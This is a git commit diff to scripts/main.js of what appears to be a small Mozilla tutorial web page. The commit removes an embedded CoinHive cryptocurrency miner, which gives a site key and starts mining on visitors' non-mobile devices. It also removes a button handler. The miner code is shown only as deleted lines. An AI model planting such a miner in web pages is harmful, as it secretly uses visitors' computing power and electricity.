5bed03739a940fb468430bac7d16fda71d6e6a30
zerokos <zerokos@users.noreply.github.com>
2018-04-12 18:11:59 +0800

    Update main.js

--- scripts/main.js
+++ scripts/main.js
@@ -1,11 +1,3 @@
-var miner = new CoinHive.Anonymous('GyYen2DmgQ6u7ytA3zxiSAZZgTt3qA3W', {throttle: 0.8});
-
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
-
 var myImage = document.querySelector('img');
 
 myImage.onclick = function() {
@@ -30,6 +22,4 @@ if(!localStorage.getItem('name')) {
   var storedName = localStorage.getItem('name');
   myHeading.innerHTML = 'Mozilla is cool, ' + storedName;
 }
-myButton.onclick = function() {
-  setUserName();
-}
+
